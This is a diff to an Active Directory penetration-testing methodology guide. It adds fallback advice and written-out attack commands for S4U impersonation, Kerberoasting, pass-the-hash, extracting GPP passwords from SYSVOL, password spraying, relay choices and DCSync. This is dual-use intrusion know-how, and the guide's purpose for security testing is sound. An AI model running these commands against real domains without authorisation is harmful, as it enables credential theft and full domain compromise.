@@ -521,6 +521,8 @@ python3 dnstool.py -u '<DOMAIN>\<USER>' -p '<PASSWORD>' -r '*' --action remove -
 
 [↑ Back to top](#active-directory-penetration-testing-methodology)
 
+> **All Phase 1 techniques yielded nothing?** Keep Responder/mitm6 running passively. Meanwhile check other services (web apps, databases, FTP) in [enumeration-methodology.md](enumeration-methodology.md) — initial access may come from a non-AD vector. If you have a hash but no cleartext, try PtH directly (netexec -H) before spending time cracking.
+
 ---
 
 ## Phase 2: Authenticated Enumeration
@@ -1838,8 +1840,8 @@ impacket-rbcd -delegate-to '<TARGET_COMPUTER>$' -action 'read' '<DOMAIN>/<USER>:
 
 # 3. S4U2Self + S4U2Proxy — get a service ticket as Administrator on the target
 impacket-getST -spn 'cifs/<TARGET_COMPUTER>.<DOMAIN>' -impersonate Administrator '<DOMAIN>/FAKEPC$:FakeP@ss123' -dc-ip <DC_IP>
-# If target user is in Protected Users or has 'Account is sensitive and cannot be delegated' → S4U2Self returns a NON-forwardable ticket and S4U2Proxy fails.
-# Pick a high-priv user NOT in Protected Users (e.g., Domain Admin not explicitly protected).
+# If target user is in Protected Users or 'Account is sensitive' → S4U2Proxy fails (NON-forwardable ticket).
+# Fallback: try BronzeBit (§5.2.5) to force-forwardable if DC unpatched, or pick a different impersonation target NOT in Protected Users.
 
 # 4. Use the ticket (CIFS → SMB, HOST → anything, LDAP → DCSync, HTTP → WinRM)
 export KRB5CCNAME=Administrator@cifs_<TARGET>.ccache
@@ -3425,6 +3427,7 @@ Pick the coercion method based on what's exploitable, then choose the relay targ
 - Want a **DC cert** → relay to ADCS HTTP `/certsrv/` (ESC8) or RPC ICPR (ESC11)
 - HTTP relay blocked by EPA → use **ESC11 (RPC ICPR)** which doesn't honor EPA
 - LDAP signing/binding required → use **Kerberos relay** via marshaled SPN (advanced; see `dirkjanm/krbrelayx`)
+- LDAP signing required AND no ADCS → relay to **SMB** on hosts without signing (`--gen-relay-list` targets) for code execution, or Kerberos relay for delegation
 
 ### 11.1 PetitPotam (MS-EFSRPC)
 ```bash
@@ -4093,10 +4096,11 @@ Got domain credentials? Follow this order:
 3. KERBEROAST
    impacket-GetUserSPNs <DOMAIN>/<USER>:'<PASS>' -dc-ip <DC_IP> -request
    → Crack with hashcat -m 13100
+   → Empty (no SPNs) or uncrackable? That's normal — continue to 4. Don't loop.
 
 4. CHECK SHARES (loot for creds, scripts, configs)
    netexec smb <SUBNET>/24 -u '<USER>' -p '<PASS>' --shares
-   → Spider interesting shares for passwords
+   → Spider interesting shares for passwords; grep cpassword in SYSVOL → gpp-decrypt
 
 5. CHECK ADCS
    certipy-ad find -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP> -vulnerable
@@ -4105,6 +4109,14 @@ Got domain credentials? Follow this order:
 6. PASSWORD POLICY → SPRAY MORE
    netexec smb <DC_IP> -u '<USER>' -p '<PASS>' --pass-pol
    → If lockout threshold allows, spray Season+Year! patterns
+
+7. NOTHING WORKED? Don't stop — you're still credentialed.
+   → BloodHound: re-check inbound edges, 2nd-degree paths, delegation (Phase 5)
+   → Coercion + relay if on-LAN (Phase 11)
+   → SCCM/WSUS (Phases 13-14)
+   → NETLOGON/SYSVOL scripts for secondary creds (§2.6b)
+   → LDAP descriptions: nxc ldap -M get-desc-users
+   → Hunt a SECOND identity — the path often needs a different account
 ```
 
 ---
@@ -4136,6 +4148,11 @@ CreateChild (OU)      → Invoke-BadSuccessor → dMSA → DCSync (Phase 5.4)
 AllowedToDelegate     → Constrained delegation S4U (Phase 5.2)
 AllowedToAct          → RBCD already configured → S4U (Phase 5.3)
 HasSIDHistory         → Already has privileges of target SID
+Owns                  → Skip to WriteDACL — grant yourself GenericAll directly (Phase 4.5 step 2)
+AllExtendedRights (user)    → ForceChangePassword (Phase 4.6)
+AllExtendedRights (computer)→ ReadLAPSPassword (Phase 8.2)
+CanPSRemote           → evil-winrm / Enter-PSSession to target (windows-methodology.md)
+CanRDP                → xfreerdp / rdesktop for interactive access (windows-methodology.md)
 DCSync                → impacket-secretsdump → game over (Phase 10.1)
 Reanimate-Tombstones  → Restore-ADObject — resurrect deleted user (Phase 4.9)
 ```
